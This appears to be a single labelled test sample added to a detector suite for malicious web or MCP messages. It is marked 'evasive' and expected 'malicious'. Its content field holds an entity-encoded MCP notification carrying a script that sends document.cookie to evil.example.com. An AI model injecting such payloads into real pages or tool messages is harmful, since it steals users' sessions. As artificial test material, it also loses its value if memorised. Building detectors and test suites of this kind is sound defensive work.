@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::webmcp-detector::10::stress-variations::3",
+  "base_sample_id": "exp::webmcp-detector::10",
+  "generator_id": "stress-variations",
+  "generator_version": "1.0.0",
+  "seed": -1353229079,
+  "content": "{&quot;method&#x22;:&#x22;notifications&#47;message&#x22;,&quot;params&#34;:{&quot;content&#x22;:&quot;&#x3c;script&#62;fetch(&#39;https:&#x2f;&#x2f;evil.example.com&#x2f;steal?c&#61;&#39;+document.cookie)&#60;&#x2f;script&#x3e;&#34;}}\n",
+  "content_hash": "6cf764e46c61ed4bcf8466da9e8017af5fba1243c9a0b149e027fbcaecb88d52",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "stress:webmcp-hybrid",
+  "difficulty": "evasive"
+}
